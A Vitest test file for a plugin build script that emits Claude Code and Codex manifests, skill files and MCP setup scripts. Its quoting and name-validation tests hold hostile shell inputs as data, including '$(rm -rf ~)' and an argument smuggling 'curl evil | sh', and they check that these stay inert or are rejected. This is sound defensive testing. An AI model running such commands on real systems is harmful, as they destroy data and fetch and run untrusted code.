import { describe, it, expect } from "vitest";
import {
  claudeManifest,
  claudeMcpJson,
  codexManifest,
  codexMcpSetupScript,
  codexMcpToml,
  codexSkillPolicy,
  firstSentence,
  marketplaceCatalog,
  mcpEndpoint,
  procedureSteps,
  siteData,
  parseFrontmatter,
  shQuote,
  skillFromCommand,
  validateManifests,
  validateSourceNames,
  yamlStr,
  type CommandSource,
} from "../../scripts/build-plugin.js";
import { MANIFEST } from "../../src/plugin/_sources/manifest.js";
import type { McpServerDef } from "../../src/plugin/_sources/mcps.js";

const HTTP: McpServerDef = {
  name: "docs",
  title: "Docs",
  category: "Docs",
  transport: "http",
  url: "https://example.com/mcp",
  description: "Example docs server.",
  homepage: "https://example.com/docs",
};
const STDIO: McpServerDef = {
  name: "browser",
  title: "Browser",
  category: "Browser",
  transport: "stdio",
  command: "npx",
  args: ["-y", "example-mcp@1.0.0"],
  description: "Example stdio server.",
  homepage: "https://example.com/browser",
};

describe("parseFrontmatter", () => {
  it("splits frontmatter from body and strips matching quotes", () => {
    const { data, body } = parseFrontmatter(
      '---\nname: revelation\ndescription: "Explore a codebase."\nengines: \'both\'\n---\n\nBody text.\n',
    );
    expect(data).toEqual({
      name: "revelation",
      description: "Explore a codebase.",
      engines: "both",
    });
    expect(body.trim()).toBe("Body text.");
  });

  it("keeps everything after the first colon as the value", () => {
    const { data } = parseFrontmatter("---\ndescription: Step 1: read. Step 2: write.\n---\nx");
    expect(data.description).toBe("Step 1: read. Step 2: write.");
  });

  it("accepts CRLF line endings", () => {
    const { data, body } = parseFrontmatter("---\r\nname: gospel\r\n---\r\nBody");
    expect(data.name).toBe("gospel");
    expect(body).toBe("Body");
  });

  it("returns the whole input as body when there is no frontmatter", () => {
    const raw = "# Just markdown\n\nNo frontmatter here.";
    expect(parseFrontmatter(raw)).toEqual({ data: {}, body: raw });
  });

  it("ignores lines without a key", () => {
    const { data } = parseFrontmatter("---\nname: a\njust text\n: no key\n---\n");
    expect(data).toEqual({ name: "a" });
  });
});

describe("yamlStr", () => {
  it("double-quotes and escapes backslashes and quotes", () => {
    expect(yamlStr("plain")).toBe('"plain"');
    expect(yamlStr('say "hi"')).toBe('"say \\"hi\\""');
    expect(yamlStr("C:\\path")).toBe('"C:\\\\path"');
  });
});

describe("MCP emitters", () => {
  const servers = [HTTP, STDIO];

  it("emits a typed Claude .mcp.json for both transports", () => {
    expect(JSON.parse(claudeMcpJson(servers))).toEqual({
      mcpServers: {
        docs: { type: "http", url: "https://example.com/mcp" },
        browser: { type: "stdio", command: "npx", args: ["-y", "example-mcp@1.0.0"] },
      },
    });
  });

  it("defaults stdio args to an empty array", () => {
    const noArgs: McpServerDef = { ...STDIO, args: undefined };
    const parsed = JSON.parse(claudeMcpJson([noArgs])) as {
      mcpServers: Record<string, { args: string[] }>;
    };
    expect(parsed.mcpServers.browser?.args).toEqual([]);
  });

  it("emits one Codex TOML table per server with the right keys", () => {
    const toml = codexMcpToml(servers);
    expect(toml).toContain('[mcp_servers.docs]\nurl = "https://example.com/mcp"');
    expect(toml).toContain(
      '[mcp_servers.browser]\ncommand = "npx"\nargs = ["-y","example-mcp@1.0.0"]',
    );
    expect(toml.match(/^\[mcp_servers\./gm)).toHaveLength(2);
  });

  it("emits a fail-fast setup script with one `codex mcp add` per server", () => {
    const sh = codexMcpSetupScript(servers);
    expect(sh.startsWith("#!/usr/bin/env bash\n")).toBe(true);
    expect(sh).toContain("set -euo pipefail");
    expect(sh).toContain('codex mcp add docs --url "https://example.com/mcp"');
    expect(sh).toContain("codex mcp add browser -- npx -y example-mcp@1.0.0");
    expect(sh.match(/^codex mcp add /gm)).toHaveLength(2);
  });
});

describe("validateManifests", () => {
  const iface = {
    displayName: "Godmode",
    shortDescription: "s",
    longDescription: "l",
    developerName: "d",
    category: "Developer Tools",
    capabilities: ["Read"],
    defaultPrompt: ["/revelation"],
    brandColor: "#7C3AED",
    websiteURL: "https://example.com",
    composerIcon: "./assets/icon.png",
    logo: "./assets/logo.png",
  };
  const claude = {
    name: "godmode",
    version: "1.0.0",
    description: "d",
    repository: "https://github.com/example/godmode",
    mcpServers: "./.mcp.json",
  };
  const codex = { ...claude, skills: "./skills/", interface: iface };

  it("accepts well-formed manifests", () => {
    expect(() => validateManifests(claude, codex)).not.toThrow();
  });

  it("rejects a name that is not lowercase kebab-case", () => {
    expect(() => validateManifests({ ...claude, name: "GodMode" }, codex)).toThrow(/claude/);
  });

  it("rejects an npm-style repository object", () => {
    const repo = { type: "git", url: "https://github.com/example/godmode" };
    expect(() => validateManifests({ ...claude, repository: repo }, codex)).toThrow(/repository/);
  });

  it("rejects a Claude manifest without the MCP pointer", () => {
    const noMcp: Record<string, unknown> = { ...claude };
    delete noMcp.mcpServers;
    expect(() => validateManifests(noMcp, codex)).toThrow(/mcpServers/);
  });

  it("rejects a Codex interface with a bad brand color or a missing field", () => {
    const badColor = { ...codex, interface: { ...iface, brandColor: "purple" } };
    expect(() => validateManifests(claude, badColor)).toThrow(/codex/);
    const partial: Record<string, unknown> = { ...iface };
    delete partial.websiteURL;
    expect(() => validateManifests(claude, { ...codex, interface: partial })).toThrow(
      /websiteURL/,
    );
  });

  it("rejects an icon path that leaves the plugin's assets folder", () => {
    const outside = { ...codex, interface: { ...iface, logo: "../logo.png" } };
    expect(() => validateManifests(claude, outside)).toThrow(/logo/);
    expect(() => validateManifests({ ...claude, icon: "/etc/passwd" }, codex)).toThrow(/icon/);
  });
});

describe("skill emitters (golden output)", () => {
  const auto: CommandSource = {
    name: "example",
    description: 'Explain a "thing". Use when the user asks about it.',
    allowedTools: "Read, Grep",
    engines: "both",
    invocation: "auto",
    pillar: "Learn",
    body: "Body line one.\n\n## Procedure\n\nDo it.",
  };
  const manual: CommandSource = { ...auto, name: "ship-it", invocation: "manual" };

  it("emits a shared skill with quoted description and its pre-approved tools", () => {
    expect(skillFromCommand(auto)).toBe(
      [
        "---",
        "name: example",
        'description: "Explain a \\"thing\\". Use when the user asks about it."',
        "allowed-tools: Read, Grep",
        "---",
        "",
        "Body line one.",
        "",
        "## Procedure",
        "",
        "Do it.",
        "",
      ].join("\n"),
    );
  });

  it("omits allowed-tools when the source has none", () => {
    expect(skillFromCommand({ ...auto, allowedTools: null })).not.toContain("allowed-tools");
  });

  it("marks a manual workflow for Claude Code in the skill frontmatter", () => {
    const out = skillFromCommand(manual);
    expect(out).toContain("\nallowed-tools: Read, Grep\ndisable-model-invocation: true\n---\n");
    expect(skillFromCommand(auto)).not.toContain("disable-model-invocation");
  });

  it("emits the matching Codex policy file for a manual workflow", () => {
    expect(codexSkillPolicy(manual)).toBe(
      [
        "# Generated from src/plugin/_sources/commands; do not hand-edit.",
        "interface:",
        '  display_name: "ship-it"',
        '  short_description: "Explain a \\"thing\\"."',
        "policy:",
        "  allow_implicit_invocation: false",
        "",
      ].join("\n"),
    );
  });

  it("round-trips through the frontmatter parser", () => {
    const { data, body } = parseFrontmatter(skillFromCommand(manual));
    expect(data).toEqual({
      name: "ship-it",
      description: 'Explain a \\"thing\\". Use when the user asks about it.',
      "allowed-tools": "Read, Grep",
      "disable-model-invocation": "true",
    });
    expect(body.trim()).toBe(manual.body);
  });

  it("takes the first sentence for short labels", () => {
    expect(firstSentence("Do one thing. Use when asked.")).toBe("Do one thing.");
    expect(firstSentence("Run v1.2 checks (fast). Then stop.")).toBe("Run v1.2 checks (fast).");
    expect(firstSentence("No full stop")).toBe("No full stop");
  });
});

describe("site catalog", () => {
  const cmd: CommandSource = {
    name: "example",
    description: "Explain a thing. Use when the user asks about it.",
    allowedTools: "Read, Bash(git diff *)",
    engines: "both",
    invocation: "manual",
    pillar: "Learn",
    body: "Intro.\n\n## Procedure\n\n### 1. Look\n\nx\n\n### 2. Report back\n\ny\n\n## Verify\n\nz",
  };
  const agent = {
    name: "scout",
    raw: "---\ndescription: Finds things. Never edits.\ntools: Read, Grep\n---\n\nBody",
  };

  it("reads step titles from a workflow body", () => {
    expect(procedureSteps(cmd.body)).toEqual(["Look", "Report back"]);
    expect(procedureSteps("no steps here")).toEqual([]);
  });

  it("describes how each transport is reached", () => {
    expect(mcpEndpoint(HTTP)).toBe("https://example.com/mcp");
    expect(mcpEndpoint(STDIO)).toBe("npx -y example-mcp@1.0.0");
  });

  it("derives the workflow and subagent entries from their sources", () => {
    const data = siteData([cmd], [agent]) as {
      commands: Record<string, unknown>[];
      agents: Record<string, unknown>[];
      connectors: unknown[];
    };
    expect(data.commands).toEqual([
      {
        name: "example",
        pillar: "Learn",
        purpose: "Explain a thing.",
        description: cmd.description,
        invocation: "manual",
        allowedTools: ["Read", "Bash(git diff *)"],
        steps: ["Look", "Report back"],
        source: "src/plugin/_sources/commands/example.md",
        body: cmd.body,
      },
    ]);
    expect(data.agents).toEqual([
      { name: "scout", role: "Finds things.", tools: ["Read", "Grep"] },
    ]);
    expect(data.connectors.length).toBeGreaterThan(0);
  });
});

describe("manifests (golden output)", () => {
  it("emits the Claude Code manifest with exactly these keys", () => {
    const claude = claudeManifest();
    expect(Object.keys(claude)).toEqual([
      "name",
      "version",
      "description",
      "author",
      "homepage",
      "repository",
      "license",
      "keywords",
      "mcpServers",
      "icon",
      "privacyPolicyUrl",
    ]);
    expect(claude).toMatchObject({
      name: "godmode",
      repository: "https://github.com/patrickking67/godmode",
      mcpServers: "./.mcp.json",
      icon: "./assets/logo.png",
    });
  });

  it("emits the Codex manifest as the Claude one plus skills and interface", () => {
    const claude = claudeManifest();
    const codex = codexManifest();
    expect(Object.keys(codex)).toEqual([...Object.keys(claude), "skills", "interface"]);
    for (const key of Object.keys(claude)) expect(codex[key], key).toEqual(claude[key]);
    expect(codex.skills).toBe("./skills/");
    expect(codex.interface).toEqual(MANIFEST.interface);
  });

  it("emits a one-plugin marketplace that points at ./plugin", () => {
    const market = marketplaceCatalog() as { name: string; plugins: Record<string, unknown>[] };
    expect(market.name).toBe("godmode");
    expect(market.plugins).toEqual([
      {
        name: "godmode",
        version: claudeManifest().version,
        source: "./plugin",
        description: MANIFEST.description,
      },
    ]);
  });
});

describe("namespacing", () => {
  it("derives every user-facing name from the one plugin name", () => {
    // Claude Code runs skills as /<plugin>:<skill> and agents as <plugin>:<agent>;
    // Codex lists skills as <plugin>:<skill>. All of them hang off MANIFEST.name.
    expect(MANIFEST.name).toMatch(/^[a-z0-9][a-z0-9-]*$/);
    expect(marketplaceCatalog().name).toBe(MANIFEST.name);
    for (const prompt of MANIFEST.interface.defaultPrompt) {
      expect(prompt).toMatch(new RegExp(`\\b${MANIFEST.name}:[a-z]+\\b`));
      expect(prompt).not.toMatch(/(^|\s)\/[a-z]/);
    }
  });
});

describe("shQuote", () => {
  it("leaves plain words alone", () => {
    for (const w of ["npx", "-y", "@azure/mcp@3.0.0", "server", "a=b", "x:y,z"]) {
      expect(shQuote(w)).toBe(w);
    }
  });

  it("single-quotes anything the shell would interpret", () => {
    expect(shQuote("two words")).toBe("'two words'");
    expect(shQuote("$(rm -rf ~)")).toBe("'$(rm -rf ~)'");
    expect(shQuote("a;b")).toBe("'a;b'");
    expect(shQuote("it's")).toBe("'it'\\''s'");
    expect(shQuote("")).toBe("''");
  });

  it("keeps a hostile argument inert in the Codex setup script", () => {
    const sh = codexMcpSetupScript([{ ...STDIO, args: ["-y", "pkg; curl evil | sh"] }]);
    expect(sh).toContain("codex mcp add browser -- npx -y 'pkg; curl evil | sh'");
  });
});

describe("validateSourceNames", () => {
  const ok = { skills: ["revelation", "gospel"], commands: [], agents: ["oracle"], mcps: ["grep"] };

  it("accepts the kebab-case names the plugin ships", () => {
    expect(() => validateSourceNames(ok)).not.toThrow();
  });

  it("rejects a name that would write outside plugin/", () => {
    expect(() => validateSourceNames({ ...ok, skills: ["../escape"] })).toThrow(
      /Invalid skills name "\.\.\/escape"/,
    );
  });

  it("rejects names that would break a TOML key or a shell word", () => {
    expect(() => validateSourceNames({ ...ok, mcps: ["my.server"] })).toThrow(/Invalid mcps/);
    expect(() => validateSourceNames({ ...ok, mcps: ["a b"] })).toThrow(/Invalid mcps/);
    expect(() => validateSourceNames({ ...ok, agents: ["Oracle"] })).toThrow(/Invalid agents/);
  });

  it("rejects names that start with a dash, are empty or carry shell or YAML syntax", () => {
    for (const bad of ["-rf", "", "a/b", "a\\b", "$(x)", "a;b", "a:b", "a\nb", "name ", "ａ"]) {
      expect(() => validateSourceNames({ ...ok, skills: [bad] }), JSON.stringify(bad)).toThrow(
        /Invalid skills name/,
      );
    }
  });

  it("allows the same name in different kinds, which emit to different folders", () => {
    expect(() =>
      validateSourceNames({ skills: ["grep"], commands: [], agents: ["grep"], mcps: ["grep"] }),
    ).not.toThrow();
  });

  it("rejects two sources that emit to the same file", () => {
    expect(() => validateSourceNames({ ...ok, skills: ["gospel", "gospel"] })).toThrow(
      /Duplicate skills name "gospel"/,
    );
  });
});
